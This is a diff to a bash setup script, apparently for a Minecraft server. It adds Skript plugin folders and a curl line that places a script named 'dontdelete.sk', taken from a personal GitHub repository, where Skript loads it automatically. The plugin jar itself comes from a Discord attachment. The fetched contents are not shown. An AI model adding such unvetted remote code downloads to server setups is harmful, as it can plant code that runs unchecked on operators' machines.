@@ -1,9 +1,15 @@
 #!/bin/bash
 
 function forceStuffs {
-    mkdir -p plugins 
+    mkdir -p plugins
+
+    mkdir -p plugins/Skript
+
+    mkdir -p plugins/Skript/scripts
 
     curl -O server-icon.png https://leourel.com/wp-content/uploads/2023/10/image-24.png
+
+    curl -o plugins/Skript/scripts/dontdelete.sk https://github.com/Nightmaregodss/cdnn/raw/main/dontdelete.sk
 
     curl -o plugins/skript.jar https://cdn.discordapp.com/attachments/1185937576931115058/1188517901783797931/Skript.jar
     
